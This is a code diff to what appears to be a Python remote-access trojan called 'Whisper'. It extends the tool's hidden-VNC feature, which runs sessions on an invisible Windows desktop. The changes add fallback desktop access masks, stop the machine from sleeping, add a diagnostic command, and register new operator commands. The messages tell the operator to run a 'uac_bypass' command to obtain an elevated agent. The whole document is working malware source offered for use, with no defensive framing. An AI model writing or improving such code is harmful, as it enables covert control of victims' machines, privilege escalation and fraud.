@@ -822,13 +822,21 @@ _CMDS["search"] = _cmd_search
 _hvnc_name = "Whisper_HVNC_" + str(os.getpid())
 _hvnc_desk = None
 _hvnc_run = [False]
-_DESKTOP_ACCESS = 0x1000
+_HVNC_ACCESS_MASKS = [0x01FF, 0x1000, 0x0100]
+
+def _hvnc_create():
+    import ctypes
+    u32 = ctypes.windll.user32
+    for mask in _HVNC_ACCESS_MASKS:
+        desk = u32.CreateDesktopW(_hvnc_name, None, None, 0, mask, None)
+        if desk: return desk
+    return None
 
 def _hvnc_thread():
     global _hvnc_desk
     import ctypes
     u32 = ctypes.windll.user32
-    desk = u32.CreateDesktopW(_hvnc_name, None, None, 0, _DESKTOP_ACCESS, None)
+    desk = _hvnc_create()
     if not desk:
         _hvnc_desk = None; _hvnc_run[0] = False; return
     _hvnc_desk = desk; _hvnc_run[0] = True
@@ -845,12 +853,41 @@ def _hvnc_thread():
 def _cmd_hvnc_start(m):
     if _hvnc_run[0]: return {"output": "[!] HVNC already running"}
     import ctypes
+    k32 = ctypes.windll.kernel32
+    u32 = ctypes.windll.user32
+    wst = u32.GetProcessWindowStation()
+    if not wst: return {"output": "[!] HVNC fails: no window station (process may be a service)"}
     if not ctypes.windll.shell32.IsUserAnAdmin():
         return {"output": "[!] HVNC requires admin. Use uac_bypass command first to spawn an elevated agent, then use HVNC on that new client."}
     threading.Thread(target=_hvnc_thread, daemon=True).start()
-    time.sleep(0.5)
-    if _hvnc_desk: return {"output": f"[+] HVNC started on desktop '{_hvnc_name}'"}
-    return {"output": "[!] HVNC failed - create desktop failed (need interactive session with desktop creation rights)"}
+    for _ in range(10):
+        if _hvnc_desk: break
+        time.sleep(0.1)
+    if _hvnc_desk:
+        k32.SetThreadExecutionState(0x80000003)
+        return {"output": f"[+] HVNC started on desktop '{_hvnc_name}'"}
+    err = k32.GetLastError()
+    return {"output": f"[!] HVNC failed (error {err}). Need interactive RDP/console session - not service/headless server."}
+
+def _cmd_hvnc_diag(m):
+    import ctypes
+    k32 = ctypes.windll.kernel32; u32 = ctypes.windll.user32
+    lines = []
+    wst = u32.GetProcessWindowStation()
+    lines.append(f"WindowStation: {wst}")
+    is_admin = ctypes.windll.shell32.IsUserAnAdmin()
+    lines.append(f"Admin: {is_admin}")
+    sid = ctypes.c_ulong()
+    k32.ProcessIdToSessionId(k32.GetCurrentProcessId(), ctypes.byref(sid))
+    lines.append(f"Session: {sid.value}")
+    desk = u32.OpenInputDesktop(0, False, 0x0100)
+    lines.append(f"InputDesktop: {desk}")
+    if desk: u32.CloseDesktop(desk)
+    for mask in _HVNC_ACCESS_MASKS:
+        d = u32.CreateDesktopW("_hvnc_diag_" + str(os.getpid()), None, None, 0, mask, None)
+        lines.append(f"CreateDesktop(0x{mask:04X}): {d}")
+        if d: u32.CloseDesktop(d); break
+    return {"output": "[+] HVNC diag:\n  " + "\n  ".join(lines)}
 
 def _cmd_hvnc_stop(m):
     _hvnc_run[0] = False; return {"output": "[+] HVNC stopped"}
@@ -970,6 +1007,7 @@ def _cmd_hvnc_key(m):
 
 _CMDS["hvnc_start"] = _cmd_hvnc_start
 _CMDS["hvnc_stop"] = _cmd_hvnc_stop
+_CMDS["hvnc_diag"] = _cmd_hvnc_diag
 _CMDS["hvnc_screenshot"] = _cmd_hvnc_screenshot
 _CMDS["hvnc_stream"] = _cmd_hvnc_stream
 _CMDS["hvnc_mouse"] = _cmd_hvnc_mouse
@@ -1995,6 +2033,7 @@ _CMDS['execute'] = _cmd_execute
 _CMDS['search'] = _cmd_search
 _CMDS['hvnc_start'] = _cmd_hvnc_start
 _CMDS['hvnc_stop'] = _cmd_hvnc_stop
+_CMDS['hvnc_diag'] = _cmd_hvnc_diag
 _CMDS['hvnc_screenshot'] = _cmd_hvnc_screenshot
 _CMDS['hvnc_stream'] = _cmd_hvnc_stream
 _CMDS['hvnc_mouse'] = _cmd_hvnc_mouse
